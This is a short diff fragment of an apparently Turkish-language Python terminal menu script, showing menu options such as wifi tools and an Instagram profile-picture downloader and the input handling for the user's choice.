-sys.exit(app.exec_())
                         rcode = call(['python', 'altsurec.py'])
                         system("clear")
                         sleep(3)
@@ -1715,7 +1390,6 @@ sys.exit(app.exec_())
             9-Connect
             12-İnstagram pp download
                                             """.format(sistem_ara(), x, internet_connection_control(), update_check()))
-
                                 JFKbdhf = int(input("Secim:"))
                                 if JFKbdhf == 1:
                                     wifi_tools()
